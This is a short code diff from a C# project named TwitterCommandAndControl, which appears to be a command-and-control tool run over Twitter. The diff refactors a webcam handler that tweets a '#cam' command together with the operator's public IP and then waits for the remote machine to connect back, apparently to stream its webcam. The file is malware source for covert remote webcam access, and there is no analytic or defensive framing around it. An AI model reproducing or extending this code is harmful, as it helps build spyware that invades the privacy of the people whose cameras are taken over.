@@ -9,12 +9,14 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using TwitterCommandAndControl.Core;
 
-namespace TwitterCommandAndControl
+namespace TwitterCommandAndControl.Handlers
 {
-    public static class WebcamHandler
+    public class WebcamHandler : Handler
     {
-        private const int PORT = 8888;
+        private WebcamHandler() : base() { }
+
         public static void Respond(string command)
         {
             command = command.ToLower();
@@ -76,17 +78,10 @@ namespace TwitterCommandAndControl
 
         public static TcpClient Request(string commandPrefix)
         {
-            TcpClient client = null;
-            var listenerTask = Task.Factory.StartNew(() =>
-            {
-                TcpListener listener = new TcpListener(IPAddress.Any, PORT);
-                listener.Start();
-                client = listener.AcceptTcpClient();
-                listener.Stop();
-            });
+            var listenerTask = NextClient();
             Messenger.Send(commandPrefix + " #cam #ip=" + GetPublicIP.GetIP());
             listenerTask.Wait();
-            return client;
+            return listenerTask.Result;
         }
     }
 }
